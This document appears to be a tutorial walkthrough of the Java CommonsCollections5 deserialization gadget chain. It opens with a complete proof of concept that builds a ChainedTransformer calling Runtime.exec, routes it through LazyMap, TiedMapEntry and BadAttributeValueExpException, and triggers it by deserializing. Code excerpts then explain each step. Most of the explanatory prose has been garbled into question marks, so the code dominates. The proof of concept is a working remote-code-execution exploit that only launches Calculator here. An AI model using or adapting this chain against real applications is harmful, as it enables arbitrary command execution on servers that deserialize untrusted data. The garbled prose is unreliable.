POC

```java
package demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" })
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outtermap,1);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Class clazz = Class.forName("javax.management.BadAttributeValueExpException");
        Field val = clazz.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
        objectOutputStream.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        objectInputStream.readObject();

    }
}

```

CC5??????BadAttributeValueExpException????????????????????????

```java
  private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```

System.getSecurityManager ??????null??????????????????????????????toString?????????SecurityManager?????????null???



```java
     Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" })
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        Map outtermap = LazyMap.decorate(innermap,chainedTransformer);
```

???CC1????????????lazyMap??????transformers????????????lazyMap#get??????????????????transform???CC5???????????????TiedMapEntry?????????lazyMap#get??????

???TiedMapEntry????????????

```java
    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }
    
        public Object getValue() {
        return map.get(key);
    }
    
        public String toString() {
        return getKey() + "=" + getValue();
    }
```

??????????????????map???getValue??????map???get?????????toString??????getValue?????????????????????????????????????????????

```java
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Class clazz = Class.forName("javax.management.BadAttributeValueExpException");
        Field val = clazz.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);
```

new??????BadAttributeValueExpException?????????????????????????????????val????????????tiedMapEntry?????????????????????????????????BadAttributeValueExpException???????????????????????????tiedMapEntry???toString?????????